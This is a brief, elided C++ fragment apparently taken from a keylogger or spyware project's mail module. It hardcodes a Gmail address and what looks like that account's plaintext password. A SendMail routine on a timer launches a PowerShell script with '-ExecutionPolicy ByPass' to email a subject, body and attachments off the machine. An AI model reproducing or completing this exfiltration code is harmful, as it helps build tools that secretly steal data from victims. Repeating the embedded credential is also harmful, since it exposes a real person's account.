...
namespace Mail
{
    #define X_EM_TO "michawa042@gmail.com"
    #define X_EM_FROM "michawa042@gmail.com"
    #define X_EM_PASS "Omar20423288"
...
Timer m_timer;
int SendMail(const std::string &subject, const std::string &body, const std::string &attachements)
{
    bool ok;
    ...
    std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" + StringReplace(subject, "\"","\\\"") + "\" -Body \""  + StringReplace(body, "\"","\\\"") + "\" -Att \"" + attachements + "\"";
